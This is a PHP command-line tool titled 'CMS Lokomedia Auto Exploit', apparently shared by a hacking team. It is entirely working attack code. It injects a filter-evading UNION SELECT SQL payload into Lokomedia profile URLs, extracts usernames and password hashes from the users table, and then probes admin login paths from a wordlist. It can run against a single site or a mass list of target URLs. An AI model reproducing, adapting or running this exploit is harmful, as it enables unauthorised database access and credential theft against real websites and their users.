<?php

error_reporting(0);

require_once "Console/Table.php";

function exploit($url) {
    $url_replace = str_replace("-profil.html", "", $url);
    $response = file_get_contents($url_replace."'/*!12345union*/+/*!12345select*/+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username,password)),@)--+-profil.html");
    preg_match('/<meta name="description" content="(.*?)">/', $response, $data);
    preg_match_all("/<li>,(.*?),(.*?),/", $data[1], $empas);
    preg_match('/statis-(.*?)-profil.html/', $url, $inject_point);
    $urll = str_replace($inject_point[0], "", $url);
    if($empas[0] && $empas[1] && $empas[2]) {
        echo "\n\n";
        $tbl = new Console_table();
        $tbl->setHeaders(['Host', 'Username', 'Password', 'Type Hash']);
        for($i = 0;$i < sizeof($empas[1]); $i++) {
            if(strlen($empas[2][$i]) == 32) {
                $tbl->addRow(array($urll, $empas[1][$i], $empas[2][$i], 'MD5'));
            }else{
                $tbl->addRow(array($urll, $empas[1][$i], $empas[2][$i], 'Unknown'));
            }
        }
        echo $tbl->getTable() ."\n\n";
        echo "\033[95m[\033[93m?\033[95m] \033[97mFind admin login ? \033[95m[\033[92my\033[97m/\033[91mn\033[95m]: ";
        $find = trim(fgets(STDIN, 1024));
        if($find == "y") {
            findAdlog($urll);
        }
    } else{
        echo "\033[95m[\033[91m-\033[95m] \033[97m$urll is not vulnerable to the lokomedia method\n";
    }

}

function findAdlog($url) {
    echo "\033[95m[\033[93m!\033[95m] \033[97mFinding admin login...\n\n";
    $wordlist = file_get_contents("list-admin.txt");
    $wordlist = explode("\n", $wordlist);
    foreach($wordlist as $list) {
        $header = get_headers($url . $list);
        $status = $header[0];
        if(preg_match("/200/", $status)) {
            echo "\033[95m[\033[92m+\033[95m] \033[97mFound admin login : ".$url."$list\n";
        }else {
            echo "\033[95m[\033[91m-\033[95m] \033[97mNot Found Admin Login : ".$url."$list\n"; 
        }
    }
}

echo "
   \033[92m     \ /     +------------------------------------+
   \033[92m     oVo     |\033[97mCMS Lokomedia Auto Exploit          \033[92m|
   \033[92m \___XXX___/ |\033[97mAuthor: Muhammad Fauzan @dominic404 \033[92m|
   \033[92m  __XXXXX__  |\033[97mTeam  : { IndoSec }                 \033[92m|
   \033[92m /__XXXXX__\ +------------------------------------+
   \033[92m /   XXX   \ /
   \033[92m      V ____/
";
echo "\033[95m[\033[93m?\033[95m] \033[97mMulti \033[92m/ \033[97mSingle [m/s]: ";
$multi_or_single = trim(fgets(STDIN, 1024));
if($multi_or_single == "m") {
    echo "\033[95m[\033[92m+\033[95m] \033[97mInput List Url: ";
    $list = trim(fgets(STDIN, 1024));
    $get_list = file_get_contents($list);
    if(!$get_list) {
        echo "\033[95m[\033[91m-\033[95m] \033[97mList Not Found\n";
    }else{
        $get_list = explode("\n", $get_list);
        foreach($get_list as $lists) {
            exploit($lists);
            if($get_list[count($get_list)-1] == $lists) {
                echo "\033[95m[\033[92m+\033[95m] \033[97mDone exploiting lokomedia..\n";
            }
        }
    }
}else {
    echo "\033[95m[\033[93m?\033[95m] \033[97mInput URL : ";
    $url = trim(fgets(STDIN, 1024));
    exploit($url);
}

?>
